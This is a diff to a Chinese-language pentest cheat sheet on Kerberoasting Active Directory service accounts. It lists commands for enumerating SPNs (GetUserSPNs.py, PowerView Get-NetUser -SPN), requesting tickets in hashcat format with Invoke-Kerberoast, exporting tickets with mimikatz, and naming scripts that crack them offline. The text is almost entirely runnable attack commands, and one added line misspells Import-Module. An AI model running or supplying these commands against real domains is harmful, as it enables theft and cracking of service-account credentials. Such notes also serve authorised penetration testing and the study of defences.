@@ -34,8 +34,11 @@ python3 GetUserSPNs.py target.com/svc_tgs:xxxxxxxxxxxxxx -dc-ip 10.10.xxx.xxx -r
 # 识别SPN
 Get-NetUser -username "svc_tgs" -SPN | select samaccountname, primarygroupid, serviceprincipalname
 
+Import-Moudle .\PowerView.ps1
+Get-NetUser -SPN
+
 # Empire，指定获取到的票据以适用于hashcat暴破的格式输出
-Import-Module .\invoke-kerberoast.ps1
+Import-Module .\Invoke-kerberoast.ps1
 Invoke-Kerberoast -Domain target.com -OutputFormat Hashcat | fl
 
 # 导出所有票据（和mimikatz类似）
@@ -58,7 +61,7 @@ sekurlsa::tickets /export
 
 ### kerberoast
 
-* 常用脚本：**tgscrepcrack.py**
+* 常用脚本：**tgscrepcrack.py、**GetUserSPNs.ps1、GetUserSPNs.vbs
 
 ```bash
 # 离线暴破
